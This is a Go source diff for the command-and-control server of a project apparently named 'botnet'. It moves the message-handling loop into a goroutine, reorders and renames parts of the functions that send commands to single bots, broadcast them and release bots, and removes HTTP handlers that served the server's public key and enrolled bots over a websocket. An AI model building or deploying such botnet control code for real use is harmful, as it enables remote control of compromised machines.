@@ -2,9 +2,8 @@ package ccserver
 
 import (
 	"crypto/rsa"
-	"encoding/json"
+
 	"log"
-	"net/http"
 
 	"github.com/adrianosela/botnet/command-and-control/ccworker"
 	"github.com/adrianosela/botnet/lib/encryption"
@@ -28,31 +27,21 @@ func NewCommandAndControl() (*CommandAndControl, error) {
 		return nil, err
 	}
 	log.Printf("[cmd&ctrl] command and control public key: \n%s", string(pub))
-	return &CommandAndControl{
+	cc := &CommandAndControl{
 		msgDecryptKey: priv,
 		msgEncryptKey: string(pub),
 		bots:          make(map[string]*ccworker.BotWorker),
 		recvMsgChan:   make(chan *protocol.Message),
-	}, nil
-}
-
-// RunBotnet begins botnet communication
-func (cc *CommandAndControl) RunBotnet() {
-	for {
-		select {
-		case msg := <-cc.recvMsgChan:
-			cc.HandleBotMessage(msg)
+	}
+	go func() {
+		for {
+			select {
+			case msg := <-cc.recvMsgChan:
+				cc.HandleBotMessage(msg)
+			}
 		}
-	}
-}
-
-// ReleaseBot de registers a bot from a botnet
-func (cc *CommandAndControl) ReleaseBot(id string) {
-	if bot, ok := cc.bots[id]; ok {
-		delete(cc.bots, id)
-		bot.GreafulShutdown()
-	}
-	log.Printf("[cmd&ctrl] bot %s left net", id)
+	}()
+	return cc, nil
 }
 
 // HandleBotMessage handles a single given message
@@ -67,6 +56,13 @@ func (cc *CommandAndControl) HandleBotMessage(msg *protocol.Message) {
 	}
 }
 
+// SendCommandToBot sends a command to only one given bot
+func (cc *CommandAndControl) SendCommandToBot(cmd *protocol.Command, id string) {
+	if err := cc.bots[id].SendCommandToRemote(cmd); err != nil {
+		cc.ReleaseBot(id)
+	}
+}
+
 // BroadcastCommand broadcasts a command to all bots
 func (cc *CommandAndControl) BroadcastCommand(cmd *protocol.Command) {
 	log.Printf("[cmd&ctrl] broadcasting command to %d bots\n", len(cc.bots))
@@ -75,37 +71,11 @@ func (cc *CommandAndControl) BroadcastCommand(cmd *protocol.Command) {
 	}
 }
 
-// SendCommandToBot sends a command to only one given bot
-func (cc *CommandAndControl) SendCommandToBot(cmd *protocol.Command, botID string) {
-	if err := cc.bots[botID].SendCommandToRemote(cmd); err != nil {
-		cc.ReleaseBot(botID)
+// ReleaseBot de registers a bot from a botnet
+func (cc *CommandAndControl) ReleaseBot(id string) {
+	if bot, ok := cc.bots[id]; ok {
+		delete(cc.bots, id)
+		bot.GracefulShutdown()
 	}
-}
-
-// KeyHTTPHandler serves the CC server's public key
-func (cc *CommandAndControl) KeyHTTPHandler(w http.ResponseWriter, r *http.Request) {
-	ccDiscoveryBytes, err := json.Marshal(&protocol.CCDiscovery{Key: cc.msgEncryptKey})
-	if err != nil {
-		w.WriteHeader(http.StatusInternalServerError)
-		w.Write([]byte("could not return command and control discovery struct"))
-		return
-	}
-	w.WriteHeader(http.StatusOK)
-	w.Write(ccDiscoveryBytes)
-	return
-}
-
-// CommandAndControlHTTPHandler serves the HTTP entrypoint to the botnet websocket
-func (cc *CommandAndControl) CommandAndControlHTTPHandler(w http.ResponseWriter, r *http.Request) {
-	// dispatch a new worker to handle the underlying botnet communication protocol
-	bot, err := ccworker.DispatchNewBot(w, r, cc.msgDecryptKey, cc.recvMsgChan)
-	if err != nil {
-		w.WriteHeader(http.StatusTeapot)
-		w.Write([]byte(":("))
-		log.Printf(" [cmd&ctrl] there was a failed bot dispatch for %s: %s", r.RemoteAddr, r.UserAgent())
-		return
-	}
-	// add bot to global map of bot workers
-	cc.bots[bot.ID] = bot
-	log.Printf("[cmd&ctrl] bot %s joined net", bot.ID)
+	log.Printf("[cmd&ctrl] bot %s left net", id)
 }
